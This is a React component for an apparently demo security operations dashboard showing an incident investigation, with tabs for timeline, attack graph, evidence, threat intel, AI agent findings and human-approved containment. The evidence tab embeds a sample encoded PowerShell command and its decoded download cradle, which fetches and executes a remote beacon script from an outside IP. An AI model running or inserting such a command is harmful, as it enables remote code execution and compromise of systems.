import React, { useState } from 'react';
import { 
  Clock, 
  Server, 
  Bot, 
  CheckCircle, 
  Check, 
  X
} from 'lucide-react';
import type { Incident, TimelineEntry, ResponseAction } from '../types';

interface IncidentsViewProps {
  selectedIncident: Incident;
  allIncidents: Incident[];
  onSelectIncident: (inc: Incident) => void;
  timeline: TimelineEntry[];
  actions: ResponseAction[];
  onApproveAction: (id: string) => void;
  onRejectAction: (id: string) => void;
}

export const IncidentsView: React.FC<IncidentsViewProps> = ({
  selectedIncident,
  allIncidents,
  onSelectIncident,
  timeline,
  actions,
  onApproveAction,
  onRejectAction
}) => {
  const [activeTab, setActiveTab] = useState<
    'overview' | 'timeline' | 'graph' | 'evidence' | 'threat_intel' | 'ai_analysis' | 'response' | 'audit'
  >('overview');

  const pendingForThisIncident = actions.filter(
    a => a.incident_number === selectedIncident.incident_number && a.status === 'PENDING_APPROVAL'
  );

  return (
    <div className="space-y-5">
      {/* Incident Switcher Strip */}
      <div className="flex items-center space-x-2 overflow-x-auto pb-1 border-b border-[#1E2A38]">
        <span className="text-[11px] text-[#7D8A99] font-mono uppercase mr-2">Incidents:</span>
        {allIncidents.map(inc => (
          <button
            key={inc.id}
            onClick={() => onSelectIncident(inc)}
            className={`px-3 py-1.5 rounded text-xs font-mono font-semibold transition flex items-center space-x-2 border ${
              selectedIncident.id === inc.id
                ? 'bg-[#111923] text-[#00D9FF] border-[#00D9FF]'
                : 'bg-[#0D131C] text-[#7D8A99] border-[#1E2A38] hover:text-white'
            }`}
          >
            <span>{inc.incident_number}</span>
            <span className={`w-1.5 h-1.5 rounded-full ${
              inc.severity === 'CRITICAL' ? 'bg-[#FF1744]' :
              inc.severity === 'HIGH' ? 'bg-[#F59E0B]' : 'bg-[#00D9FF]'
            }`}></span>
          </button>
        ))}
      </div>

      {/* Main Incident Dossier Header */}
      <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-6 relative overflow-hidden">
        <div className="flex flex-col lg:flex-row justify-between items-start lg:items-center gap-4">
          <div>
            <div className="flex items-center space-x-3 mb-2">
              <span className="font-mono text-base font-extrabold text-[#00D9FF] px-2.5 py-0.5 rounded bg-[#00D9FF]/10 border border-[#00D9FF]/30">
                {selectedIncident.incident_number}
              </span>
              <span className="px-2.5 py-0.5 rounded text-xs font-bold bg-[#FF1744]/15 text-[#FF1744] border border-[#FF1744]/30 flex items-center space-x-1">
                <span className="w-1.5 h-1.5 rounded-full bg-[#FF1744] animate-pulse"></span>
                <span>{selectedIncident.severity}</span>
              </span>
              <span className="px-2.5 py-0.5 rounded text-xs font-semibold bg-[#1E2A38] text-white">
                {selectedIncident.status}
              </span>
            </div>
            <h1 className="text-xl font-bold text-white tracking-wide">{selectedIncident.title}</h1>
            <p className="text-xs text-[#7D8A99] mt-1 max-w-3xl">{selectedIncident.summary}</p>
          </div>

          {/* Risk Score Pill Card */}
          <div className="flex items-center space-x-6 bg-[#070B12] border border-[#1E2A38] p-4 rounded-xl">
            <div className="text-center">
              <span className="text-[10px] text-[#7D8A99] uppercase font-mono tracking-wider block">Risk Score</span>
              <span className="text-3xl font-extrabold text-[#FF1744] font-mono leading-none">{selectedIncident.risk_score}</span>
              <span className="text-[10px] text-[#7D8A99] font-mono block">/ 100</span>
            </div>
            <div className="h-10 w-[1px] bg-[#1E2A38]"></div>
            <div className="space-y-1 text-xs">
              <div className="flex items-center space-x-2">
                <Server className="w-3.5 h-3.5 text-[#00D9FF]" />
                <span className="text-[#7D8A99]">Asset:</span>
                <strong className="text-white font-mono">{selectedIncident.affected_asset}</strong>
              </div>
              <div className="flex items-center space-x-2">
                <Clock className="w-3.5 h-3.5 text-[#7D8A99]" />
                <span className="text-[#7D8A99]">First Seen:</span>
                <span className="text-white font-mono text-[11px]">{selectedIncident.first_seen}</span>
              </div>
            </div>
          </div>
        </div>

        {/* Tab Navigation */}
        <div className="flex items-center space-x-1 mt-6 border-b border-[#1E2A38] overflow-x-auto text-xs font-medium">
          {[
            { id: 'overview', label: 'Overview' },
            { id: 'timeline', label: 'Timeline' },
            { id: 'graph', label: 'Attack Graph' },
            { id: 'evidence', label: 'Evidence Locker' },
            { id: 'threat_intel', label: 'Threat Intel' },
            { id: 'ai_analysis', label: 'AI Multi-Agent Report' },
            { id: 'response', label: `Response (${pendingForThisIncident.length} Pending)` },
            { id: 'audit', label: 'Audit Log' }
          ].map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as any)}
              className={`px-4 py-2.5 transition border-b-2 font-medium whitespace-nowrap ${
                activeTab === tab.id
                  ? 'border-[#00D9FF] text-[#00D9FF] bg-[#070B12]/40'
                  : 'border-transparent text-[#7D8A99] hover:text-[#E6EDF3]'
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>
      </div>

      {/* Tab 1: Overview */}
      {activeTab === 'overview' && (
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          <div className="lg:col-span-2 space-y-6">
            <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-5">
              <h2 className="text-sm font-bold text-white mb-3">Investigation Summary</h2>
              <p className="text-xs text-[#E6EDF3] leading-relaxed">
                On 2026-09-30 at 10:42:03 EAT, an administrator session was authenticated on core host 
                <strong> {selectedIncident.affected_asset}</strong> ({selectedIncident.asset_ip}). Seventeen seconds later, an in-memory PowerShell child process (PID 4812) executed an obfuscated base64 command string. Network telemetry captured immediate outbound HTTPS handshakes to known Cobalt Strike command & control IP <strong>185.220.101.5</strong>.
              </p>
              
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-4 pt-4 border-t border-[#1E2A38]">
                <div className="bg-[#0D131C] p-3 rounded-lg border border-[#1E2A38]">
                  <span className="text-[10px] text-[#7D8A99] block font-mono">Assigned Lead</span>
                  <span className="text-xs font-semibold text-white">{selectedIncident.assigned_analyst}</span>
                </div>
                <div className="bg-[#0D131C] p-3 rounded-lg border border-[#1E2A38]">
                  <span className="text-[10px] text-[#7D8A99] block font-mono">Department</span>
                  <span className="text-xs font-semibold text-white">{selectedIncident.department}</span>
                </div>
                <div className="bg-[#0D131C] p-3 rounded-lg border border-[#1E2A38]">
                  <span className="text-[10px] text-[#7D8A99] block font-mono">Asset IP</span>
                  <span className="text-xs font-mono font-semibold text-[#00D9FF]">{selectedIncident.asset_ip}</span>
                </div>
                <div className="bg-[#0D131C] p-3 rounded-lg border border-[#1E2A38]">
                  <span className="text-[10px] text-[#7D8A99] block font-mono">Containment</span>
                  <span className="text-xs font-semibold text-[#F59E0B]">Pending Approval</span>
                </div>
              </div>
            </div>

            {/* MITRE ATT&CK Matrix Mapping */}
            <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-5">
              <h2 className="text-sm font-bold text-white mb-3">MITRE ATT&CK Matrix Progression</h2>
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                <div className="bg-[#0D131C] border-l-2 border-[#00D9FF] p-3 rounded-r-lg">
                  <span className="text-[10px] text-[#00D9FF] font-mono uppercase">Initial Access</span>
                  <p className="text-xs font-bold text-white mt-1">T1078</p>
                  <p className="text-[11px] text-[#7D8A99]">Valid Accounts</p>
                </div>
                <div className="bg-[#0D131C] border-l-2 border-[#FF1744] p-3 rounded-r-lg">
                  <span className="text-[10px] text-[#FF1744] font-mono uppercase">Execution</span>
                  <p className="text-xs font-bold text-white mt-1">T1059.001</p>
                  <p className="text-[11px] text-[#7D8A99]">PowerShell</p>
                </div>
                <div className="bg-[#0D131C] border-l-2 border-[#F59E0B] p-3 rounded-r-lg">
                  <span className="text-[10px] text-[#F59E0B] font-mono uppercase">Defense Evasion</span>
                  <p className="text-xs font-bold text-white mt-1">T1027</p>
                  <p className="text-[11px] text-[#7D8A99]">Obfuscation</p>
                </div>
                <div className="bg-[#0D131C] border-l-2 border-[#FF1744] p-3 rounded-r-lg">
                  <span className="text-[10px] text-[#FF1744] font-mono uppercase">Command & Control</span>
                  <p className="text-xs font-bold text-white mt-1">T1071.001</p>
                  <p className="text-[11px] text-[#7D8A99]">Web Protocols</p>
                </div>
              </div>
            </div>
          </div>

          {/* Right Rail: Quick Actions & Risk Breakdown */}
          <div className="space-y-4">
            <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-5">
              <h2 className="text-sm font-bold text-white mb-2">Pending Human Approvals</h2>
              <p className="text-xs text-[#7D8A99] mb-4">AI-recommended actions waiting for your confirmation</p>
              
              {pendingForThisIncident.length === 0 ? (
                <div className="text-xs text-[#22C55E] flex items-center space-x-1.5 p-3 bg-[#0D131C] rounded-lg">
                  <CheckCircle className="w-4 h-4" />
                  <span>All containment recommendations approved.</span>
                </div>
              ) : (
                <div className="space-y-3">
                  {pendingForThisIncident.map(act => (
                    <div key={act.id} className="bg-[#0D131C] border border-[#F59E0B]/30 rounded-lg p-3">
                      <div className="flex justify-between items-start mb-1">
                        <span className="font-mono text-xs font-bold text-white">{act.action_type}</span>
                        <span className="text-[10px] font-mono text-[#F59E0B]">{act.confidence}% Conf.</span>
                      </div>
                      <p className="text-[11px] text-[#7D8A99] mb-2">{act.target_entity}</p>
                      <div className="flex items-center space-x-2 pt-2 border-t border-[#1E2A38]">
                        <button
                          onClick={() => onApproveAction(act.id)}
                          className="flex-1 py-1 px-2 rounded bg-[#22C55E] hover:bg-[#22C55E]/80 text-black font-bold text-[11px] flex items-center justify-center space-x-1 transition"
                        >
                          <Check className="w-3.5 h-3.5" />
                          <span>Approve</span>
                        </button>
                        <button
                          onClick={() => onRejectAction(act.id)}
                          className="py-1 px-2 rounded bg-[#111923] border border-[#FF1744]/40 hover:bg-[#FF1744]/20 text-[#FF1744] text-[11px] flex items-center justify-center transition"
                        >
                          <X className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Tab 2: Timeline */}
      {activeTab === 'timeline' && (
        <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-6">
          <div className="mb-4">
            <h2 className="text-sm font-bold text-white">Chronological Attack Lifecycle</h2>
            <p className="text-xs text-[#7D8A99]">Correlated security progression from initial interactive authentication to C2 telemetry</p>
          </div>

          <div className="relative pl-6 space-y-6 before:absolute before:left-2 before:top-2 before:bottom-2 before:w-0.5 before:bg-[#1E2A38]">
            {timeline.map((item, idx) => (
              <div key={idx} className="relative group">
                <div className={`absolute -left-6 top-1 w-4 h-4 rounded-full border-2 bg-[#070B12] flex items-center justify-center ${
                  item.severity === 'CRITICAL' ? 'border-[#FF1744]' :
                  item.severity === 'HIGH' ? 'border-[#F59E0B]' :
                  item.severity === 'MEDIUM' ? 'border-[#00D9FF]' : 'border-[#7D8A99]'
                }`}>
                  <div className={`w-1.5 h-1.5 rounded-full ${
                    item.severity === 'CRITICAL' ? 'bg-[#FF1744]' :
                    item.severity === 'HIGH' ? 'bg-[#F59E0B]' :
                    item.severity === 'MEDIUM' ? 'bg-[#00D9FF]' : 'bg-[#7D8A99]'
                  }`}></div>
                </div>

                <div className="bg-[#0D131C] border border-[#1E2A38] rounded-lg p-3 hover:border-[#00D9FF]/50 transition">
                  <div className="flex items-center justify-between mb-1">
                    <span className="font-mono text-xs font-bold text-[#00D9FF]">{item.time} EAT</span>
                    <span className={`text-[10px] font-mono px-1.5 py-0.2 rounded ${
                      item.severity === 'CRITICAL' ? 'bg-[#FF1744]/15 text-[#FF1744]' :
                      item.severity === 'HIGH' ? 'bg-[#F59E0B]/15 text-[#F59E0B]' :
                      'bg-[#00D9FF]/15 text-[#00D9FF]'
                    }`}>
                      {item.type.toUpperCase()}
                    </span>
                  </div>
                  <p className="text-xs text-white font-medium">{item.event}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Tab 3: Interactive Attack Graph */}
      {activeTab === 'graph' && (
        <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-6">
          <div className="flex justify-between items-center mb-4">
            <div>
              <h2 className="text-sm font-bold text-white">Attack Relationship Topology Graph</h2>
              <p className="text-xs text-[#7D8A99]">Multi-entity graph linking compromised user, host, process, file hash, and C2 infrastructure</p>
            </div>
            <span className="text-[11px] font-mono px-2 py-1 rounded bg-[#00D9FF]/10 text-[#00D9FF] border border-[#00D9FF]/30">
              Interactive Correlation Node Map
            </span>
          </div>

          <div className="w-full h-80 bg-[#070B12] border border-[#1E2A38] rounded-lg relative flex items-center justify-center p-4 overflow-hidden">
            <svg className="w-full h-full" viewBox="0 0 800 300">
              <defs>
                <marker id="arrow" viewBox="0 0 10 10" refX="5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
                  <path d="M 0 0 L 10 5 L 0 10 z" fill="#00D9FF" />
                </marker>
              </defs>

              <line x1="120" y1="150" x2="260" y2="150" stroke="#00D9FF" strokeWidth="2" strokeDasharray="4 2" markerEnd="url(#arrow)" />
              <line x1="340" y1="150" x2="480" y2="100" stroke="#FF1744" strokeWidth="2" markerEnd="url(#arrow)" />
              <line x1="340" y1="150" x2="480" y2="200" stroke="#FF1744" strokeWidth="2" markerEnd="url(#arrow)" />
              <line x1="560" y1="200" x2="700" y2="200" stroke="#FF1744" strokeWidth="2" markerEnd="url(#arrow)" />

              <g transform="translate(60, 120)">
                <rect width="100" height="60" rx="8" fill="#111923" stroke="#1E2A38" strokeWidth="1.5" />
                <text x="50" y="26" textAnchor="middle" fill="#7D8A99" fontSize="10" fontFamily="sans-serif">Compromised User</text>
                <text x="50" y="44" textAnchor="middle" fill="#FFFFFF" fontSize="11" fontWeight="bold" fontFamily="monospace">administrator</text>
              </g>

              <g transform="translate(260, 120)">
                <rect width="110" height="60" rx="8" fill="#111923" stroke="#00D9FF" strokeWidth="2" />
                <text x="55" y="26" textAnchor="middle" fill="#00D9FF" fontSize="10" fontFamily="sans-serif">Asset / Server</text>
                <text x="55" y="44" textAnchor="middle" fill="#FFFFFF" fontSize="12" fontWeight="bold" fontFamily="monospace">SERVER-04</text>
              </g>

              <g transform="translate(480, 70)">
                <rect width="120" height="60" rx="8" fill="#111923" stroke="#FF1744" strokeWidth="2" />
                <text x="60" y="26" textAnchor="middle" fill="#FF1744" fontSize="10" fontFamily="sans-serif">Malicious Process</text>
                <text x="60" y="44" textAnchor="middle" fill="#FFFFFF" fontSize="11" fontWeight="bold" fontFamily="monospace">powershell.exe</text>
              </g>

              <g transform="translate(480, 170)">
                <rect width="120" height="60" rx="8" fill="#111923" stroke="#FF1744" strokeWidth="2" />
                <text x="60" y="26" textAnchor="middle" fill="#FF1744" fontSize="10" fontFamily="sans-serif">C2 Beacon Socket</text>
                <text x="60" y="44" textAnchor="middle" fill="#FFFFFF" fontSize="11" fontWeight="bold" fontFamily="monospace">185.220.101.5</text>
              </g>

              <g transform="translate(680, 170)">
                <rect width="110" height="60" rx="8" fill="#111923" stroke="#FF1744" strokeWidth="2" />
                <text x="55" y="26" textAnchor="middle" fill="#FF1744" fontSize="10" fontFamily="sans-serif">Threat Actor</text>
                <text x="55" y="44" textAnchor="middle" fill="#FFFFFF" fontSize="10" fontWeight="bold" fontFamily="sans-serif">Cobalt Strike C2</text>
              </g>
            </svg>
          </div>
        </div>
      )}

      {/* Tab 4: Evidence Locker */}
      {activeTab === 'evidence' && (
        <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-6 space-y-4">
          <div className="flex justify-between items-center">
            <div>
              <h2 className="text-sm font-bold text-white">Cryptographically Verified Evidence Locker</h2>
              <p className="text-xs text-[#7D8A99]">Chain-of-custody preserved forensic artifacts</p>
            </div>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-[#22C55E]/10 text-[#22C55E] border border-[#22C55E]/20">
              SHA-256 Verified
            </span>
          </div>

          <div className="space-y-3 font-mono text-xs">
            <div className="p-4 bg-[#070B12] border border-[#1E2A38] rounded-lg">
              <div className="flex justify-between text-[#7D8A99] mb-1">
                <span>Artifact 1: ScriptBlock Execution Trace (PID 4812)</span>
                <span>Collected: 10:42:21 EAT</span>
              </div>
              <pre className="text-[#00D9FF] bg-[#0D131C] p-2.5 rounded border border-[#1E2A38] overflow-x-auto text-[11px]">
{`powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwAxADgANQAuADIAMgAwAC4AMQAwADEALgA1AC8AYgBlAGEAYwBvAG4ALgBwAHMxIikA`}
              </pre>
              <p className="text-[10px] text-[#7D8A99] mt-2">
                Decoded: <code className="text-white">IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/beacon.ps1')</code>
              </p>
            </div>

            <div className="p-4 bg-[#070B12] border border-[#1E2A38] rounded-lg">
              <div className="flex justify-between text-[#7D8A99] mb-1">
                <span>Artifact 2: Dropped In-Memory Payload Binary</span>
                <span>SHA-256 Hash</span>
              </div>
              <p className="text-[#22C55E] font-bold">7d4b29c9103a89e924a2734ef0350d24fb4b3e6480c55ffc06a928db6928e469</p>
              <p className="text-[10px] text-[#7D8A99] mt-1">Matched in VirusTotal: Cobalt Strike Beacon DLL loader (99% threat score)</p>
            </div>
          </div>
        </div>
      )}

      {/* Tab 5: Threat Intelligence */}
      {activeTab === 'threat_intel' && (
        <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-6">
          <h2 className="text-sm font-bold text-white mb-2">Threat Intelligence Indicator Correlation</h2>
          <p className="text-xs text-[#7D8A99] mb-4">Cross-referenced against Ethio-CERT, INSA and global cybersecurity feeds</p>

          <div className="p-4 bg-[#0D131C] border border-[#FF1744]/40 rounded-xl space-y-3">
            <div className="flex justify-between items-center">
              <span className="font-mono text-base font-bold text-white">185.220.101.5</span>
              <span className="px-2.5 py-0.5 rounded text-xs font-bold bg-[#FF1744]/20 text-[#FF1744] border border-[#FF1744]">
                MALICIOUS • 96% CONFIDENCE
              </span>
            </div>
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs pt-2 border-t border-[#1E2A38]">
              <div>
                <span className="text-[10px] text-[#7D8A99] block font-mono">Threat Actor</span>
                <span className="text-white font-medium">APT-CobaltStrike-Actor</span>
              </div>
              <div>
                <span className="text-[10px] text-[#7D8A99] block font-mono">Associated Campaign</span>
                <span className="text-white font-medium">Operation Red Nile</span>
              </div>
              <div>
                <span className="text-[10px] text-[#7D8A99] block font-mono">Location / Autonomous System</span>
                <span className="text-white font-medium">Germany (Tor Exit Node)</span>
              </div>
              <div>
                <span className="text-[10px] text-[#7D8A99] block font-mono">Source Feed</span>
                <span className="text-[#00D9FF] font-medium">Ethio-CERT Threat Intel</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Tab 6: AI Multi-Agent Report */}
      {activeTab === 'ai_analysis' && (
        <div className="space-y-4">
          <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-5">
            <div className="flex items-center space-x-2 mb-2">
              <Bot className="w-5 h-5 text-[#00D9FF]" />
              <h2 className="text-base font-bold text-white">7-Agent Coordinated Intelligence Output</h2>
            </div>
            <p className="text-xs text-[#7D8A99]">Autonomous analysis executed across 7 specialized cybersecurity agents</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-4">
              <div className="flex items-center justify-between text-xs mb-2">
                <span className="font-bold text-white flex items-center space-x-1.5">
                  <span className="w-2 h-2 rounded-full bg-[#00D9FF]"></span>
                  <span>Agent 1: Event Analysis Agent</span>
                </span>
                <span className="text-[#22C55E] font-mono text-[10px]">94% Confidence</span>
              </div>
              <p className="text-xs text-[#E6EDF3]">
                Identified obfuscated download cradle utilizing WebClient. Flagged MITRE T1059.001 and T1027 evasion signatures.
              </p>
            </div>

            <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-4">
              <div className="flex items-center justify-between text-xs mb-2">
                <span className="font-bold text-white flex items-center space-x-1.5">
                  <span className="w-2 h-2 rounded-full bg-[#FF1744]"></span>
                  <span>Agent 2: Threat Intelligence Agent</span>
                </span>
                <span className="text-[#22C55E] font-mono text-[10px]">96% Confidence</span>
              </div>
              <p className="text-xs text-[#E6EDF3]">
                Correlated destination IP 185.220.101.5 with active Cobalt Strike TeamServer infrastructure active against African financial networks.
              </p>
            </div>

            <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-4">
              <div className="flex items-center justify-between text-xs mb-2">
                <span className="font-bold text-white flex items-center space-x-1.5">
                  <span className="w-2 h-2 rounded-full bg-[#00D9FF]"></span>
                  <span>Agent 3: Correlation Agent</span>
                </span>
                <span className="text-[#22C55E] font-mono text-[10px]">93% Confidence</span>
              </div>
              <p className="text-xs text-[#E6EDF3]">
                Assembled 6 discrete telemetry records into a 4-stage Cyber Kill Chain lifecycle (Initial Access → Execution → Defense Evasion → C2).
              </p>
            </div>

            <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-4">
              <div className="flex items-center justify-between text-xs mb-2">
                <span className="font-bold text-white flex items-center space-x-1.5">
                  <span className="w-2 h-2 rounded-full bg-[#00D9FF]"></span>
                  <span>Agent 4: Investigation Agent</span>
                </span>
                <span className="text-[#22C55E] font-mono text-[10px]">94% Quality</span>
              </div>
              <p className="text-xs text-[#E6EDF3]">
                Identified affected asset SERVER-04 and accounts (administrator). Formulated next forensic steps: inspect memory string artifacts and firewall persistent beacon intervals.
              </p>
            </div>

            <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-4">
              <div className="flex items-center justify-between text-xs mb-2">
                <span className="font-bold text-white flex items-center space-x-1.5">
                  <span className="w-2 h-2 rounded-full bg-[#FF1744]"></span>
                  <span>Agent 5: Risk Assessment Agent</span>
                </span>
                <span className="text-[#FF1744] font-mono text-[10px]">Score: 92/100 (CRITICAL)</span>
              </div>
              <p className="text-xs text-[#E6EDF3]">
                Synthesized risk factors: privileged account (+28), active C2 connection (+25), core banking asset (+22), lateral traversal risk (+17).
              </p>
            </div>

            <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-4">
              <div className="flex items-center justify-between text-xs mb-2">
                <span className="font-bold text-white flex items-center space-x-1.5">
                  <span className="w-2 h-2 rounded-full bg-[#00D9FF]"></span>
                  <span>Agent 6: Security Report Agent</span>
                </span>
                <span className="text-[#22C55E] font-mono text-[10px]">Completed</span>
              </div>
              <p className="text-xs text-[#E6EDF3]">
                Generated Technical Forensic Audit dossier and Executive Summary for CISO and regulatory disclosure (INSA compliance).
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Tab 7: Response */}
      {activeTab === 'response' && (
        <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-6 space-y-4">
          <div>
            <h2 className="text-sm font-bold text-white">Containment & Remediation Actions</h2>
            <p className="text-xs text-[#7D8A99]">Safety-guaranteed human authorization interface</p>
          </div>

          <div className="space-y-3">
            {actions.filter(a => a.incident_number === selectedIncident.incident_number).map(act => (
              <div key={act.id} className="p-4 bg-[#0D131C] border border-[#1E2A38] rounded-xl flex flex-col sm:flex-row justify-between items-start sm:items-center gap-3">
                <div>
                  <div className="flex items-center space-x-2">
                    <span className="font-mono font-bold text-white text-xs">{act.action_type}</span>
                    <span className="text-[10px] font-mono text-[#00D9FF]">Target: {act.target_entity}</span>
                  </div>
                  <p className="text-xs text-[#7D8A99] mt-1">{act.reasoning}</p>
                </div>

                <div className="flex items-center space-x-2">
                  {act.status === 'PENDING_APPROVAL' ? (
                    <>
                      <button
                        onClick={() => onApproveAction(act.id)}
                        className="px-3 py-1.5 rounded bg-[#22C55E] hover:bg-[#22C55E]/80 text-black font-bold text-xs transition"
                      >
                        Approve Action
                      </button>
                      <button
                        onClick={() => onRejectAction(act.id)}
                        className="px-3 py-1.5 rounded bg-[#111923] border border-[#FF1744]/40 hover:bg-[#FF1744]/20 text-[#FF1744] text-xs transition"
                      >
                        Reject
                      </button>
                    </>
                  ) : (
                    <span className={`px-2.5 py-1 rounded text-xs font-bold ${
                      act.status === 'APPROVED' ? 'bg-[#22C55E]/15 text-[#22C55E] border border-[#22C55E]/30' : 'bg-[#FF1744]/15 text-[#FF1744]'
                    }`}>
                      {act.status}
                    </span>
                  )}
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Tab 8: Audit Log */}
      {activeTab === 'audit' && (
        <div className="bg-[#111923] border border-[#1E2A38] rounded-xl p-6">
          <h2 className="text-sm font-bold text-white mb-2">Immutable Analyst & System Audit Trail</h2>
          <p className="text-xs text-[#7D8A99] mb-4">Append-only chronological record</p>

          <div className="space-y-2 font-mono text-xs">
            {[
              { time: "10:42:21 EAT", user: "SYSTEM / Ingestion", action: "CORRELATION_INCIDENT_CREATED", details: "INC-00042 created with initial score 80" },
              { time: "10:43:14 EAT", user: "AI_RISK_AGENT", action: "RISK_SCORE_ESCALATED", details: "Promoted to 92 (CRITICAL) due to C2 match" },
              { time: "10:45:00 EAT", user: "AI_RISK_AGENT", action: "RECOMMENDATION_ENQUEUED", details: "Enqueued ISOLATE_HOST action for SERVER-04" },
              { time: "11:02:18 EAT", user: "Dawit Mengistu (Analyst)", action: "INCIDENT_VIEWED", details: "Opened forensic dossier from SOC overview" }
            ].map((log, i) => (
              <div key={i} className="p-2.5 bg-[#0D131C] border border-[#1E2A38] rounded flex flex-col sm:flex-row justify-between text-[#7D8A99]">
                <div>
                  <span className="text-white font-semibold mr-2">{log.user}:</span>
                  <span className="text-[#00D9FF]">{log.action}</span> - <span>{log.details}</span>
                </div>
                <span className="text-[10px] text-[#7D8A99]">{log.time}</span>
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
};
